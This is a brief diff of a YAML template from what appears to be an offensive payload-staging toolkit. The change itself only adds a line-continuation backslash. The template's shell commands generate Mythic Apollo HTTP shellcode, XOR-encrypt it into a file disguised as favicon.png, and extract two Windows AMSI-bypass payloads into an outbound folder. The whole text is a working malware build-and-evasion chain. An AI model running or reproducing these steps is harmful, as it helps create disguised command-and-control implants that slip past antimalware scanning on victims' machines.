@@ -7,7 +7,7 @@ metadata:
 
 content: |
   mkdir -p packstation/outbound; \
-  {{ include('scripts/generate-mythic-apollo-http-shellcode.yaml') }}
+  {{ include('scripts/generate-mythic-apollo-http-shellcode.yaml') }} \
   python {{ templates_dir }}/helper_scripts/shellcode_encrypter.py -m xor -i packstation/outbound/shellcode.bin -o packstation/outbound/favicon.png ; \
   sed -n '/^content: |/{n; s/^  //; p; q}' {{ templates_dir }}/payloads/amsi-bypass-windows-fieldoffset.yaml > packstation/outbound/offer1.txt; \
   sed -n '/^content: |/{n; s/^  //; p; q}' {{ templates_dir }}/payloads/amsi-bypass-windows-fieldoffset-2.yaml > packstation/outbound/offer2.txt; \
